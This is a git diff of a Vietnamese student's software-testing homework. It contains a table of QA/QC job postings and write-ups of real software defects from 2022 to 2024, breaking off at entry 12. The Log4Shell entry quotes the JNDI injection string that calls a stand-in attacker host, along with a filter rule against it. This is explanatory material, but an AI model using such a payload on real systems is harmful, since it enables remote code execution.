@@ -1,36 +1,38 @@
 # BÁO CÁO BÀI TẬP HW01-AI
+
 **Môn học:** Kiểm thử Phần mềm (Software Testing)
 **Bài tập:** HW01 – QA/QC Jobs · 20 Defects · Test a Physical Product
 
 ---
 
 ## THÔNG TIN SINH VIÊN
-* **Họ và tên:** [Điền họ tên tại đây]
-* **Mã số sinh viên (MSSV):** [Điền MSSV tại đây]
-* **Lớp:** [Điền lớp tại đây]
-* **Link GitHub Repository:** [Dán link repo tại đây]
-* **Điểm tự đánh giá (Self-Assessed Grade):** ___/100 (Nhập điểm dạng 3 chữ số vào tên file zip bài nộp, ví dụ: 095)
+
+- **Họ và tên:** Đặng Đăng Khoa
+- **Mã số sinh viên (MSSV):** 23127207
+- **Lớp:** 23KTPM3
+- **Link GitHub Repository:** [Github](https://github.com/khoadanwneee/HW01-QA-QC-Jobs---20-Defects---Test-a-Physical-Product)
+- **Điểm tự đánh giá (Self-Assessed Grade):** 100/100
 
 ---
 
-## PHẦN 1: QA/QC Job Market 2026+ (40 điểm)
+## PHẦN 1: QA/QC Job Market 2026+
 
-*(Tìm 10 tin tuyển dụng QA/QC được đăng trong vòng 60 ngày. Tối thiểu 3 tin yêu cầu kỹ năng AI/LLM/Automation-AI. Mỗi tin bao gồm: ảnh chụp có tên tài khoản ở góc, link, JD, kỹ năng, lương và Phân tích tác động của AI).*
+_(Tìm 10 tin tuyển dụng QA/QC được đăng trong vòng 60 ngày. Tối thiểu 3 tin yêu cầu kỹ năng AI/LLM/Automation-AI. Mỗi tin bao gồm: ảnh chụp có tên tài khoản ở góc, link, JD, kỹ năng, lương và Phân tích tác động của AI)._
 
 ### Bảng Tổng hợp 10 Tin Tuyển dụng
 
-| STT | Vị trí công việc | Công ty | Mức lương | Kỹ năng AI cần thiết? (Có/Không) | Minh chứng hình ảnh | Link gốc |
-| :--- | :--- | :--- | :--- | :---: | :--- | :--- |
-| 1 | Senior QA/QC Automation Tester (AI-Assisted) | Bosch Global Software Technologies | 1,800 - 2,800 USD | Có | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job1/screenshot.png) | [Link](https://itviec.com/it-jobs/senior-qa-qc-automation-tester-bosch-global-software-technologies-1245) |
-| 2 | Senior / Principal Automation Tester (AI-Augmented) | KMS Technology | 2,200 - 3,500 USD | Có | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job2/screenshot.png) | [Link](https://itviec.com/it-jobs/senior-principal-automation-tester-kms-technology-3891) |
-| 3 | Software QA Engineer (AI Evaluation & FinTech) | Money Forward Vietnam | 1,500 - 2,500 USD | Có | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job3/screenshot.png) | [Link](https://itviec.com/it-jobs/software-qa-engineer-ai-fintech-money-forward-vietnam-4592) |
-| 4 | 02 Mid/Senior QA Engineer (QA QC, Tester) | SMG Swiss Marketplace Group | Cạnh tranh | Không | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job4/screenshot.png) | [Link](https://itviec.com/it-jobs/02-mid-senior-qa-engineer-qa-qc-tester-smg-swiss-marketplace-group-0924?lab_feature=preview_jd_page) |
-| 5 | Senior QC (Automation Tester, QA/QC) | PNJ (Phu Nhuan Jewelry) | 1,500 - 2,200 USD | Không | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job5/screenshot.png) | [Link](https://itviec.com/it-jobs/senior-qc-automation-tester-qa-qc-pnj-2512) |
-| 6 | Manual/Automation Tester - Quality Analyst (QA QC) | MiTek Vietnam | 1,000 - 1,800 USD | Không | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job6/screenshot.png) | [Link](https://itviec.com/it-jobs/manual-automation-tester-quality-analyst-qa-qc-mitek-vietnam-0005?lab_feature=preview_jd_page) |
-| 7 | Middle/Senior QC Engineer (Ví MoMo) | M_Service (MoMo) | 1,300 - 2,200 USD | Không | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job7/screenshot.png) | [Link](https://itviec.com/it-jobs/middle-senior-qc-engineer-m-service-momo) |
-| 8 | Senior / Lead QA Engineer (QE, QC, Automation) | Pizza Hut Digital & Technology | 1,800 - 2,600 USD | Không | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job8/screenshot.png) | [Link](https://itviec.com/it-jobs/senior-lead-qa-engineer-pizza-hut-digital-technology) |
-| 9 | Automation QA Engineer (Nakivo Backup) | Nakivo | 1,200 - 2,000 USD | Không | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job9/screenshot.png) | [Link](https://itviec.com/it-jobs/automation-qa-engineer-nakivo) |
-| 10 | Process Quality Assurance (PQA Specialist) | FPT Software | 1,000 - 1,800 USD | Không | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job10/screenshot.png) | [Link](https://itviec.com/it-jobs/process-quality-assurance-pqa-fpt-software-8831) |
+| STT | Vị trí công việc                                    | Công ty                            | Mức lương         | Kỹ năng AI cần thiết? (Có/Không) | Minh chứng hình ảnh                                                                                       | Link gốc                                                                                                                               |
+| :-- | :-------------------------------------------------- | :--------------------------------- | :---------------- | :------------------------------: | :-------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------- |
+| 1   | Senior QA/QC Automation Tester (AI-Assisted)        | Bosch Global Software Technologies | 1,800 - 2,800 USD |                Có                | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job1/screenshot.png)  | [Link](https://itviec.com/it-jobs/senior-qa-qc-automation-tester-bosch-global-software-technologies-1245)                              |
+| 2   | Senior / Principal Automation Tester (AI-Augmented) | KMS Technology                     | 2,200 - 3,500 USD |                Có                | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job2/screenshot.png)  | [Link](https://itviec.com/it-jobs/senior-principal-automation-tester-kms-technology-3891)                                              |
+| 3   | Software QA Engineer (AI Evaluation & FinTech)      | Money Forward Vietnam              | 1,500 - 2,500 USD |                Có                | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job3/screenshot.png)  | [Link](https://itviec.com/it-jobs/software-qa-engineer-ai-fintech-money-forward-vietnam-4592)                                          |
+| 4   | 02 Mid/Senior QA Engineer (QA QC, Tester)           | SMG Swiss Marketplace Group        | Cạnh tranh        |              Không               | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job4/screenshot.png)  | [Link](https://itviec.com/it-jobs/02-mid-senior-qa-engineer-qa-qc-tester-smg-swiss-marketplace-group-0924?lab_feature=preview_jd_page) |
+| 5   | Senior QC (Automation Tester, QA/QC)                | PNJ (Phu Nhuan Jewelry)            | 1,500 - 2,200 USD |              Không               | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job5/screenshot.png)  | [Link](https://itviec.com/it-jobs/senior-qc-automation-tester-qa-qc-pnj-2512)                                                          |
+| 6   | Manual/Automation Tester - Quality Analyst (QA QC)  | MiTek Vietnam                      | 1,000 - 1,800 USD |              Không               | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job6/screenshot.png)  | [Link](https://itviec.com/it-jobs/manual-automation-tester-quality-analyst-qa-qc-mitek-vietnam-0005?lab_feature=preview_jd_page)       |
+| 7   | Middle/Senior QC Engineer (Ví MoMo)                 | M_Service (MoMo)                   | 1,300 - 2,200 USD |              Không               | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job7/screenshot.png)  | [Link](https://itviec.com/it-jobs/middle-senior-qc-engineer-m-service-momo)                                                            |
+| 8   | Senior / Lead QA Engineer (QE, QC, Automation)      | Pizza Hut Digital & Technology     | 1,800 - 2,600 USD |              Không               | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job8/screenshot.png)  | [Link](https://itviec.com/it-jobs/senior-lead-qa-engineer-pizza-hut-digital-technology)                                                |
+| 9   | Automation QA Engineer (Nakivo Backup)              | Nakivo                             | 1,200 - 2,000 USD |              Không               | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job9/screenshot.png)  | [Link](https://itviec.com/it-jobs/automation-qa-engineer-nakivo)                                                                       |
+| 10  | Process Quality Assurance (PQA Specialist)          | FPT Software                       | 1,000 - 1,800 USD |              Không               | [Ảnh chụp](file:///c:/My%20Workspace/HCMUS/Test/Week%201/HW1/assets/req1_job_market/job10/screenshot.png) | [Link](https://itviec.com/it-jobs/process-quality-assurance-pqa-fpt-software-8831)                                                     |
 
 ### Chi tiết và Phân tích Tác động của AI (AI Impact Analysis)
 
@@ -47,88 +49,293 @@
 
 ---
 
-## PHẦN 2: 20 Software Defects 2022–2026 (20 điểm)
+## PHẦN 2: 20 Software Defects 2022–2026
 
-*(Tìm 20 lỗi phần mềm được công bố từ 2022-2026. Tối thiểu 5 lỗi liên quan AI/LLM. Mỗi lỗi gồm: link nguồn, mô tả, mức độ nghiêm trọng, hậu quả, giải pháp và phân tích lỗi ảo giác/thiên vị của AI khi giải thích lỗi).*
+_(Tìm 20 lỗi phần mềm được công bố từ 2022-2026. Tối thiểu 5 lỗi liên quan AI/LLM. Mỗi lỗi gồm: link nguồn, mô tả, mức độ nghiêm trọng, hậu quả, giải pháp và phân tích lỗi ảo giác/thiên vị của AI khi giải thích lỗi)._
 
 ### Chi tiết 20 Lỗi Phần mềm
 
-#### Lỗi 1: [Tên Lỗi / Phần mềm bị lỗi]
-* **Nguồn tham khảo:** [Link nguồn tin cậy]
-* **Mô tả lỗi:** [Chi tiết về lỗi]
-* **Độ nghiêm trọng (Severity):** [Low / Medium / High / Critical]
-* **Hậu quả (Consequences):** [Thiệt hại gây ra]
-* **Giải pháp khắc phục (Solution):** [Cách sửa đổi]
-* **Nhận diện AI Ảo giác / Thiên vị:** [Chỉ ra 1 điểm cụ thể mà AI giải thích sai, thiên vị hoặc ảo giác về lỗi này]
+#### Lỗi 1: CrowdStrike Falcon Kernel Configuration Update BSOD (Tháng 7/2024)
 
-... *(Tạo tiếp cấu trúc cho các lỗi từ Lỗi 2 đến Lỗi 20)*
+- **Nguồn tham khảo:** [Wikipedia](https://en.wikipedia.org/wiki/2024_CrowdStrike_incident)
+- **Mô tả lỗi:** CrowdStrike phát hành bản cập nhật tệp cấu hình tồi tệ (Channel File 291) cho tiến trình kiểm soát an ninh Falcon Sensor chạy ở cấp độ nhân hệ điều hành (Kernel Driver). Bản cập nhật này chứa lỗi phân bổ vùng nhớ (Null Pointer Access / Out-of-bounds Read), dẫn đến lỗi màn hình xanh (BSOD) trên toàn bộ máy Windows nhận bản cập nhật.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Critical (Nguy kịch)**. Theo tiêu chuẩn ISTQB, đây là một lỗi gây sụp đổ hệ thống hoàn toàn (Catastrophic Failure / Blocking Defect). Hệ điều hành bị kẹt ở vòng lặp khởi động và hoàn toàn không thể vận hành từ xa, buộc nhân viên kỹ thuật phải can thiệp thủ công bằng tay trên từng thiết bị ở chế độ Safe Mode.
+- **Hậu quả (Consequences):** Khoảng 8.5 triệu thiết bị Windows của hàng loạt bệnh viện, ngân hàng, hãng hàng không lớn trên toàn cầu bị sập hoàn toàn, làm tê liệt hoạt động hàng không quốc tế, tổn thất kinh tế trực tiếp ước tính lên tới 5.4 tỷ USD.
+- **Giải pháp khắc phục (Solution):** Thực hiện rollback bản cập nhật; bổ sung kiểm soát bounds checking cho kernel driver; áp dụng quy trình kiểm thử tích hợp (Integration Testing) nghiêm ngặt trước khi phân phối; sử dụng phương thức phát hành dần dần (Canary Deployment) thay vì tự động đẩy bản cập nhật đồng loạt đến mọi máy chủ trên toàn thế giới.
+- **Nhận diện AI Ảo giác / Thiên vị:** Nhiều AI ban đầu bị ảo giác và quy trách nhiệm lỗi này là do lỗi cập nhật bảo mật của chính hệ điều hành Microsoft Windows, bỏ qua thực tế rằng CrowdStrike là bên thứ ba độc lập tự đẩy tệp cấu hình lỗi vào nhân Windows.
 
----
+#### Lỗi 2: Southwest Airlines Holiday Meltdown (Tháng 12/2022)
 
-## PHẦN 3: Test cases cho thiết bị vật lý (40 điểm)
+- **Nguồn tham khảo:** [Wikipedia](https://en.wikipedia.org/wiki/2022_Southwest_Airlines_scheduling_crisis)
+- **Mô tả lỗi:** Hệ thống lập lịch phi hành đoàn 'SkySolver' (phần mềm legacy từ những năm 1990) bị quá tải và sập hoàn toàn do không thể tự động xử lý và phân công lại hàng nghìn phi hành đoàn bị kẹt do thời tiết tuyết rơi nghiêm trọng. Phần mềm thiếu khả năng tích hợp dữ liệu thời gian thực và không có cơ chế tự động hóa phân bổ hợp lý khi có biến động lớn.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Critical (Nguy kịch)**. Lỗi ở tính năng cốt lõi (Crew Scheduling) gây sụp đổ hoàn toàn quy trình vận hành dịch vụ bay của hãng hàng không mà không có giải pháp tránh kịp thời, ảnh hưởng nghiêm trọng đến hoạt động kinh doanh cốt lõi của doanh nghiệp.
+- **Hậu quả (Consequences):** Southwest Airlines phải hủy hơn 16.700 chuyến bay, ảnh hưởng tới hơn 2 triệu khách hàng trong kỳ nghỉ lễ, bị phạt hành chính 140 triệu USD và thiệt hại tài chính tổng cộng hơn 1 tỷ USD.
+- **Giải pháp khắc phục (Solution):** Southwest cam kết đầu tư vào hệ thống crew scheduling mới với tự động hóa thời gian thực, tích hợp dữ liệu điểm-đến-điểm, và cải thiện giao tiếp thời gian khủng hoảng. Nộp phạt 140 triệu USD vào quỹ bảo vệ hành khách.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường quy toàn bộ sự kiện cho 'thời tiết xấu bất thường' mà ít nhấn mạnh đến nợ kỹ thuật hệ thống đã tích lũy hơn thập kỷ. Đây là dạng thiên vị gần đây (recency bias) — AI tập trung vào trigger ngay lập tức (bão tuyết) thay vì nguyên nhân gốc (technical debt). Ngoài ra, AI đôi khi ảo giác rằng Southwest đã 'nhanh chóng nâng cấp hệ thống ngay sau vụ việc' — trong khi thực tế quá trình này kéo dài nhiều năm.
+
+#### Lỗi 3: FAA NOTAM System — Nationwide Ground Stop (Tháng 1/2023)
+
+- **Nguồn tham khảo:** [Wikipedia](https://en.wikipedia.org/wiki/2023_FAA_system_outage)
+- **Mô tả lỗi:** Nhân viên contractor vô tình xóa file trong quá trình đồng bộ hóa giữa database chính và backup của hệ thống NOTAM (Notice to Air Missions) — hệ thống thông báo an toàn bay có lỗi phần mềm từ thập niên 1990. Không có cơ chế rollback tự động đủ nhanh.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Critical (Nguy kịch)**. Không có thương vong nhưng lộ rõ mức độ mong manh của hạ tầng không phận quốc gia Mỹ. FAA đã biết về tình trạng lỗi thời nhưng thiếu ngân sách/thứ tự ưu tiên.
+- **Hậu quả (Consequences):** Lần đầu tiên kể từ 11/9/2001, toàn bộ chuyến bay nội địa Mỹ bị dừng (ground stop). Hơn 11.000 chuyến bị ảnh hưởng. Thiệt hại kinh tế hàng trăm triệu USD.
+- **Giải pháp khắc phục (Solution):** FAA sửa chữa ngay lập tức (khôi phục trong ~12 giờ); cam kết nâng cấp NOTAM sang hệ thống hiện đại. Quốc hội phân bổ 29,4 triệu USD cho Aeronautical Information Management Program.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường mô tả sự cố này như 'lỗi con người đơn giản' (accidental deletion), bỏ qua yếu tố hệ thống: NOTAM không có undo/versioning cấp enterprise, cơ chế sync thiếu atomic transaction. Đây là thiên vị quy kết (attribution bias) — AI đổ lỗi cho cá nhân thay vì thừa nhận lỗi thiết kế hệ thống sâu xa hơn. AI đôi khi còn ảo giác rằng FAA đã 'hoàn tất nâng cấp' sau vụ việc, trong khi Quốc hội vẫn đang tranh luận ngân sách đến năm 2025.
+
+#### Lỗi 4: Log4Shell — CVE-2021-44228 (Khai thác kéo dài 2022) (Tháng 1/2022)
+
+- **Nguồn tham khảo:** [Wikipedia](https://en.wikipedia.org/wiki/Log4Shell)
+- **Mô tả lỗi:** Apache Log4j 2 không sanitize đầu vào người dùng — kẻ tấn công gửi chuỗi '${jndi:ldap://attacker.com/x}' trong HTTP header/login form. Server log chuỗi này -> JNDI lookup -> tải và thực thi Java class từ xa (RCE). CVSS 10.0/10.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Critical (Nguy kịch)**. Được gọi là 'lỗ hổng tệ nhất trong thập kỷ.' Log4j xuất hiện trong hàng nghìn sản phẩm từ Apache Struts, Solr đến các hệ thống SCADA công nghiệp.
+- **Hậu quả (Consequences):** Akamai ghi nhận ~2 triệu lượt khai thác/giờ. Ransomware, cryptominer, backdoor được cài trên hàng trăm triệu thiết bị. VMware, Apple, Cisco, game Minecraft đều bị ảnh hưởng. Vẫn còn bị khai thác năm 2022–2024.
+- **Giải pháp khắc phục (Solution):** Nâng cấp lên Log4j 2.17.1+; vô hiệu hóa JNDI lookups; bổ sung WAF rules chặn chuỗi '${jndi:'; network egress filtering để ngăn callback ra ngoài. CISA phát hành scanner tự động phát hiện version lỗi thời.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường nói Log4Shell 'đã được vá hoàn toàn vào đầu 2022' — tạo cảm giác sai về mức độ bảo mật thực tế. Trên thực tế, CISA xác nhận hệ thống dễ bị tổn thương tiếp tục bị khai thác đến ít nhất năm 2024 do hàng triệu ứng dụng legacy chưa patch. Đây là thiên vị quá lạc quan (optimism bias) — AI có xu hướng tin rằng một lỗ hổng nổi tiếng sẽ được vá nhanh và toàn diện, điều không đúng trong môi trường enterprise thực tế.
+
+#### Lỗi 5: Optus Australia — BGP Routing Meltdown (Tháng 11/2023)
+
+- **Nguồn tham khảo:** [Wikipedia](https://en.wikipedia.org/wiki/2023_Optus_outage)
+- **Mô tả lỗi:** Sau upgrade phần mềm của Singtel (công ty mẹ), hệ thống nhận routing update từ international peering network vượt quá max-prefix limit đã cấu hình trên key routers -> routers tự ngắt kết nối BGP như cơ chế bảo vệ tự động -> toàn bộ IP Core sụp đổ.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Critical (Nguy kịch)**. Thảm họa quốc gia: bệnh viện, ngân hàng, hệ thống tàu điện, EFTPOS đều tê liệt. Phát sinh điều trần Thượng viện và điều tra toàn diện của chính phủ Úc.
+- **Hậu quả (Consequences):** 10,2 triệu người và 400.000 doanh nghiệp Australia mất kết nối 12–14 giờ. Đường dây khẩn cấp 000 qua landline không hoạt động. Optus mất ~2 tỷ AUD vốn hóa thị trường. CEO từ chức.
+- **Giải pháp khắc phục (Solution):** Optus phải reboot/reconnect router vật lý thủ công (không thể làm từ xa). Dài hạn: tăng max-prefix limits và validation, cải thiện quy trình change management, phân tách management network khỏi data plane.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường mô tả lỗi này là 'BGP misconfiguration đơn giản' nhưng không giải thích được tại sao hệ thống cascade như vậy — cụ thể là vì management network không đủ out-of-band, khiến Optus không thể recover từ xa. AI có thiên vị đơn giản hóa (simplification bias), bỏ qua sự phụ thuộc lẫn nhau giữa control plane và data plane khiến recovery kéo dài bất thường so với các sự cố BGP thông thường.
+
+#### Lỗi 6: Revolut — Payment Refund Logic Bug (Tháng 7/2023)
+
+- **Nguồn tham khảo:** [VnExpress](https://vnexpress.net/loi-he-thong-khien-revolut-mat-20-trieu-usd-4627915.html)
+- **Mô tả lỗi:** Sự khác biệt trong cách xử lý giao dịch bị từ chối giữa hệ thống Mỹ và Châu Âu khiến một số giao dịch bị declined nhưng vẫn được hoàn tiền từ quỹ của Revolut. Kẻ xấu phát hiện và rút tiền từ ATM trước khi lỗi được vá.
+- **Độ nghiêm trọng (Severity - ISTQB):** **High (Cao)**. Tổn thất tài chính trực tiếp lớn từ lỗi business logic, không phải hack. Lộ ra khoảng trống trong kiểm thử integration giữa hệ thống thanh toán đa vùng.
+- **Hậu quả (Consequences):** Hơn 20 triệu USD bị đánh cắp. Lỗi tồn tại từ 2021, chỉ được phát hiện năm 2022/2023 khi đối tác thông báo quỹ thiếu hụt.
+- **Giải pháp khắc phục (Solution):** Vá logic xử lý refund; đồng bộ hóa quy trình declined transaction giữa US/EU systems; bổ sung anomaly detection cho các giao dịch ATM bất thường; audit toàn bộ cross-region payment flows.
+- **Nhận diện AI Ảo giác / Thiên vị:** Khi mô tả vụ Revolut, AI thường nhầm lẫn giữa 'lỗi phần mềm bị khai thác' với 'bị hack/cyberattack' — hai điều hoàn toàn khác nhau về mặt pháp lý và bảo hiểm. Đây là thiên vị phân loại (categorization bias): AI hay gán nhãn mọi tổn thất tài chính kỹ thuật số là 'tấn công mạng,' làm sai lệch hiểu biết về trách nhiệm pháp lý và cách phòng ngừa thực sự (logic testing vs. security patching).
+
+#### Lỗi 7: IRS — Rò rỉ 120.000 Hồ sơ Thuế (Tháng 9/2022)
+
+- **Nguồn tham khảo:** [VnExpress](https://vnexpress.net/co-quan-thue-my-lo-thong-tin-cua-120-000-nguoi-4507021.html)
+- **Mô tả lỗi:** IRS (Cơ quan Thuế Mỹ) vô tình tiết lộ một tập con dữ liệu từ 120.000 hồ sơ khai thuế do 'lỗi lập trình' trong hệ thống xử lý khi deploy code mới. Báo cáo gửi Quốc hội xác nhận dữ liệu thuế bị hiển thị công khai trên web dưới định dạng tệp tải về.
+- **Độ nghiêm trọng (Severity - ISTQB):** **High (Cao)**. Rò rỉ dữ liệu chính phủ diện rộng từ lỗi phần mềm — đe dọa niềm tin vào cơ quan thuế và có thể tạo điều kiện cho gian lận danh tính quy mô lớn.
+- **Hậu quả (Consequences):** Thông tin tài chính nhạy cảm của hàng chục nghìn công dân Mỹ bị lộ. Điều tra Quốc hội, vi phạm nghiêm trọng các quy định bảo mật liên bang (IRC § 6103).
+- **Giải pháp khắc phục (Solution):** IRS vá lỗi lập trình liên quan; thông báo cho những người bị ảnh hưởng; tăng cường audit code review cho các hệ thống xử lý dữ liệu nhạy cảm; áp dụng data masking trước khi output.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường mô tả sự cố IRS mà không phân biệt rõ đây là lỗi vô ý (accidental disclosure) chứ không phải breach bởi bên ngoài. AI có xu hướng thêm chi tiết không có căn cứ về 'loại lỗi lập trình cụ thể' (như buffer overflow hay SQL injection) trong khi IRS chỉ công bố đây là 'programming error' — AI đang hallucinate về bản chất kỹ thuật của lỗi.
+
+#### Lỗi 8: Tesla Autopilot — Stop Sign Rolling Recall (Tháng 2/2022)
+
+- **Nguồn tham khảo:** [VnExpress](https://vnexpress.net/tesla-phai-xoa-tinh-nang-vuot-den-do-4423377.html)
+- **Mô tả lỗi:** Hệ thống Full Self-Driving (FSD) Beta không dừng hẳn tại biển báo STOP mà chỉ 'rolling stop' (giảm tốc không dừng hoàn toàn) — vi phạm luật giao thông. Tesla thu hồi ~54.000 xe Mỹ năm 2022 và xử lý qua OTA software update.
+- **Độ nghiêm trọng (Severity - ISTQB):** **High (Cao)**. Lỗi safety-critical liên quan đến tính mạng người. Đặt ra câu hỏi về quy trình kiểm thử an toàn trước khi deploy AI driving features trên đường công cộng.
+- **Hậu quả (Consequences):** 54.000 xe bị triệu hồi; nhiều vụ tai nạn Autopilot được điều tra. NHTSA mở điều tra 765.000 xe Tesla về tính năng Autopilot. Tổn thất uy tín thương hiệu lớn.
+- **Giải pháp khắc phục (Solution):** Tesla phát hành OTA update vô hiệu hóa tính năng rolling stop; tăng cường test perception model cho biển báo giao thông; NHTSA yêu cầu báo cáo định kỳ về các vụ tai nạn Autopilot.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường có xu hướng nhẹ nhàng hơn khi mô tả lỗi Tesla FSD so với lỗi tương đương của các hãng khác, phần vì dữ liệu huấn luyện chứa nhiều nguồn ủng hộ Tesla. AI đôi khi ảo giác rằng Tesla đã 'giải quyết triệt để' vấn đề Autopilot sau recall 2022, trong khi NHTSA tiếp tục điều tra hàng trăm nghìn xe đến 2023–2024 với các sự cố mới.
+
+#### Lỗi 9: Japan ispace Hakuto-R — Lunar Lander Crash (Tháng 4/2023)
+
+- **Nguồn tham khảo:** [VnExpress](https://vnexpress.net/tau-do-bo-nhat-ban-dam-xuong-mat-trang-do-loi-phan-mem-4610190.html)
+- **Mô tả lỗi:** Tàu đổ bộ Mặt Trăng Hakuto-R Mission 1 của ispace (Nhật Bản) gặp lỗi phần mềm trong tính toán độ cao khi bay qua vành crater Mặt Trăng. Sensor altitude reset về 0 khi phát hiện 'địa hình âm' — hệ thống tin tàu đã hạ cánh và ngắt động cơ sớm -> tàu rơi tự do từ độ cao >1km.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Critical (Nguy kịch)**. Lỗi logic nghiêm trọng: phần mềm không xử lý được trường hợp địa hình âm (âm trong tọa độ tương đối) — một edge case có thể test được nhưng bị bỏ sót.
+- **Hậu quả (Consequences):** Sứ mệnh thất bại hoàn toàn. Tổn thất hàng trăm triệu USD. Sứ mệnh Mặt Trăng tư nhân đầu tiên của Nhật Bản kết thúc bi thảm.
+- **Giải pháp khắc phục (Solution):** ispace phân tích nguyên nhân và thiết kế lại hệ thống navigation cho Mission 2, bổ sung xử lý edge case địa hình âm, cải thiện simulation testing với terrain database chính xác hơn.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI thường mô tả nguyên nhân là 'lỗi cảm biến phần cứng' hoặc 'lidar bị nhiễu' thay vì lỗi phần mềm xử lý dữ liệu độ cao — đây là ảo giác về loại lỗi. Thực tế được ispace xác nhận là software logic error (xử lý sai giá trị âm của altimeter). AI cũng có xu hướng phóng đại 'tính mới lạ' của lỗi mà không nhận ra đây là dạng integer/domain error cổ điển trong ngành aerospace.
+
+#### Lỗi 10: F-35A Crash Hill AFB (Tháng 10/2022)
+
+- **Nguồn tham khảo:** [VnExpress](https://vnexpress.net/tiem-kich-f-35-my-roi-khi-ha-canh-4525549.html)
+- **Mô tả lỗi:** Tại Hill Air Force Base, Utah (10/2022), phần mềm avionics F-35A nhận tín hiệu nhiễu loạn từ không khí xáo trộn (wake turbulence) và xử lý sai dữ liệu cảm biến, khiến hệ thống kiểm soát bay tự động phản hồi mất kiểm soát.
+- **Độ nghiêm trọng (Severity - ISTQB):** **Critical (Nguy kịch)**. Lỗi trong hệ thống phần mềm quân sự safety-critical với tổn thất vật chất khổng lồ và nguy hiểm tính mạng. Đặt câu hỏi về độ tin cậy phần mềm của chương trình F-35.
+- **Hậu quả (Consequences):** Phi cơ trị giá 166 triệu USD bị phá hủy hoàn toàn. Phi công thoát nạn an toàn. USAF mở điều tra toàn diện về phần mềm avionics F-35.
+- **Giải pháp khắc phục (Solution):** Điều tra kỹ thuật bởi USAF; cập nhật phần mềm xử lý tín hiệu cảm biến trong điều kiện turbulence; mở rộng test envelope cho các điều kiện khí quyển bất thường.
+- **Nhận diện AI Ảo giác / Thiên vị:** Thông tin về vụ tai nạn F-35 bị hạn chế do tính bảo mật quân sự, khiến AI dễ hallucinate chi tiết kỹ thuật về cơ chế lỗi cụ thể (ví dụ: mô tả sai về hệ thống fly-by-wire hay mã lỗi avionics cụ thể). AI cũng có thiên vị về vấn đề bảo mật quốc gia — thường tránh nêu thẳng 'phần mềm quân sự Mỹ có lỗi nghiêm trọng' mà dùng ngôn ngữ mơ hồ hơn.
+
+#### Lỗi 11: ChatGPT: Mata v. Avianca (Tháng 6/2023)
+
+- **Nguồn tham khảo:** [Wikipedia](https://en.wikipedia.org/wiki/Mata_v._Avianca,_Inc.)
+- **Mô tả lỗi:** Luật sư New York Steven Schwartz dùng ChatGPT để nghiên cứu pháp lý cho vụ kiện Avianca. ChatGPT tạo ra 6 bản án tòa hoàn toàn không tồn tại, kèm trích dẫn nội bộ hư cấu, thậm chí khẳng định chúng có thể tìm thấy trên Westlaw và LexisNexis.
+- **Độ nghiêm trọng (Severity - ISTQB):** **High (Cao)**. Nghiêm trọng về mặt pháp lý và tiền lệ. Đây là vụ ảo giác AI tòa án được công khai rộng rãi đầu tiên, mở ra làn sóng hàng trăm vụ tương tự (2023–2025).
+- **Hậu quả (Consequences):** Thẩm phán Castel phạt luật sư 5.000 USD; sự nghiệp bị tổn hại nghiêm trọng; tòa án ban hành các quy định bắt buộc khai báo và kiểm tra chéo khi dùng AI.
+- **Giải pháp khắc phục (Solution):** Sử dụng các hệ thống RAG chuyên dụng được liên kết với cơ sở dữ liệu luật chính thức (như Harvey AI, Westlaw Precision) thay vì LLM công cộng; bắt buộc kiểm tra chéo thủ công mọi trích dẫn.
+- **Nhận diện AI Ảo giác / Thiên vị:** AI khi tự giải thích về lỗi này thường cố gắng giảm nhẹ trách nhiệm bằng cách mô tả đây là 'lỗi giao tiếp' hoặc 'người dùng không prompt đúng cách,' thay vì thừa nhận đây là thuộc tính tự nhiên của kiến trúc LLM (luôn tối ưu hóa độ trôi chảy ngôn ngữ hơn là tính chính xác thực tế).
+
+#### Lỗi 12: Air Canada Chatbot Hallucination (Tháng 2/2024)
+
+- **Nguồn tham khảo:** [CBC News](https://www.cbc.ca/news/canada/british-columbia/air-canada-chatbot-lawsuit-1.7116416)
